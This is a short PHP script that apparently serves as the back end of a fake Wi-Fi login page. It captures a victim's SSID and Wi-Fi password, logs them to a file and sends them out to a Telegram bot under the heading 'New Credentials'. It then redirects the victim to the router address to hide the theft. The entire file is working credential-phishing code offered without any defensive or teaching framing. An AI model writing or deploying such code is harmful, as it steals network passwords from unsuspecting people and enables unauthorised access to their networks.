<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $ssid = $_POST["ssid"];
    $password = $_POST["password"];
    $log = "SSID: " . $ssid . " | WiFi Password: " . $password . "\n";
    file_put_contents("log.txt", $log, FILE_APPEND);
    $token = "YOUR_BOT_TOKEN";
    $chat_id = "YOUR_CHAT_ID";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode("🔥 New Credentials\nSSID: " . $ssid . "\nPassword: " . $password));
    header("Location: http://192.168.1.1");
    exit();
}
?>
